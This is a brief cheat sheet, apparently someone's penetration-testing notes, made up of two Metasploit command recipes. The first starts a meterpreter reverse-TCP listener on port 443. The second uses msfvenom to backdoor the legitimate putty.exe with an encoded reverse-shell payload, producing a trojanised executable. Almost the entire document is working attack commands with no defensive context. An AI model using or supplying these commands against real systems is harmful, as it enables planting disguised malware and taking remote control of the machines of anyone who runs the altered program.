Start meterpreter listener for a Windows payload
------------------------------------------------
```bash
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST xxx.xxx.xxx.xxx
set LPORT 443
exploit
```

Backdoor a Windows Feedback Executable
------------------------------
```bash
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
```
